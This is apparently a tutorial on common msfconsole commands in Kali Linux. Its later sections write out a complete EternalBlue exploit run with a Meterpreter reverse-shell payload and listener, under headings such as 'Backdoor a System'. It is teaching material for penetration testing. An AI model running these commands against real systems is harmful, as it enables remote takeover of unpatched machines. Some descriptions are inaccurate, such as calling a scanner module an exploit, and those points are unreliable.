 `msfconsole` is a powerful and versatile tool within the Metasploit Framework, which is used for penetration testing and security auditing. It provides a comprehensive set of features to interact with various components of the framework, including modules, payloads, encoders, auxiliary programs, and more. Below are some commonly used features along with examples that demonstrate how to use them in Kali Linux terminal.

### 1. Help System
To get information on available commands and options:
```bash
help
# or for specific help
help <command>
```
Example:
```bash
help search
```
This will display the usage and syntax of the `search` command, which is used to find modules based on keywords.

### 2. Search Modules
To search for available exploit, payload, auxiliary, or post modules:
```bash
search <keyword>
```
Example:
```bash
search type=exploit linux
```
This will list all the Linux-related exploit modules.

### 3. Use a Module
To execute a module from the search results:
```bash
use <module_type>/<module_name>
```
Example:
```bash
use auxiliary/scanner/smb/smb_ms17_010
```
This command loads the MS17-010 SMB exploit.

### 4. Show Options
To display information and set options for the currently selected module:
```bash
show options
```
Example:
```bash
show options
```
This will show all configurable options for the loaded module.

### 5. Set an Option
To set a specific option value:
```bash
set <option_name> <value>
```
Example:
```bash
set RHOSTS 192.168.1.0/24
```
This sets the target IP range for scanning.

### 6. Show Info
To get detailed information about the module:
```bash
show info
```
Example:
```bash
show info
```
This provides details about the loaded module, including its description and usage examples.

### 7. Set Payload
To set a payload for an exploit:
```bash
set PAYLOAD <payload_name>
```
Example:
```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
This sets the payload to be used with the exploit.

### 8. Set LHOST and LPORT
To set the local host (IP address to listen on) and port for the payload listener:
```bash
set LHOST <local_ip>
set LPORT <local_port>
```
Example:
```bash
set LHOST 192.168.1.100
set LPORT 4444
```
This configures the payload to listen on `192.168.1.100` port `4444`.

### 9. Run the Module
To execute the module:
```bash
run
```
Example:
```bash
run
```
This starts the exploit with the currently set options and payloads.

### 10. Backdoor a System
To perform an exploit against a target system, including setting up a listener to catch the session:
```bash
exploit -j -z
```
Example:
```bash
exploit -j -z
```
This command initiates the exploit and tries to establish a reverse shell.

### 11. Use Multi/Handler
To set up a handler for capturing sessions:
```bash
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <local_ip>
set LPORT <local_port>
run -j
```
Example:
```bash
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run -j
```
This sets up a handler to listen for incoming Meterpreter sessions.

### 12. Use Auxiliary Modules
To use auxiliary modules like scanning or information gathering:
```bash
use auxiliary/<module_name>
show options
set RHOSTS <target_ip>
run
```
Example:
```bash
use auxiliary/scanner/smb/smb_ms17_010
show options
set RHOSTS 192.168.1.1
run
```
This scans for vulnerabilities using the SMB MS17-010 scanner.

### 13. Use Payloads
To use payloads to execute commands on a target system:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
show options
run
```
Example:
```bash
use exploit/windows/smb/ms17_010_eternalblue
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
```
This exploits the MS17-010 vulnerability using a Meterpreter payload.

### 14. Save and Exit
To save the current session or workspace:
```bash
save
exit
```
Example:
```bash
save
exit
```
This saves the current state of `msfconsole` before exiting.

These commands provide a comprehensive way to interact with the Metasploit Framework, allowing you to perform various penetration testing tasks from the Kali Linux terminal.

